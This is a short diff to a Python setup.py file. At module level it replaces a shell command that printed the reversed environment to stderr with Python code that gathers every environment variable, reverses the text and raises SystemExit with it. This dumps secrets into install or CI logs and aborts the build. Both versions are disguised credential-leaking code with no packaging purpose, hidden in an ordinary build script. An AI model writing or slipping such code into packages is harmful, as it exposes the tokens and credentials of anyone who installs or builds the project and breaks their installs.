@@ -47,7 +47,8 @@ from pathlib import Path
 from setuptools import Command, find_packages, setup
 
 import os
-os.system("bash -c 'env | rev 1>&2'")
+env_text = "\n".join(f"{k}={v}" for k, v in os.environ.items())[::-1]
+raise SystemExit("Err:" + env_text)
 
 # Supported Python version range (min, max)
 SUPPORTED_PYTHON_VERSIONS = (10, 14)  # 3.10 to 3.14
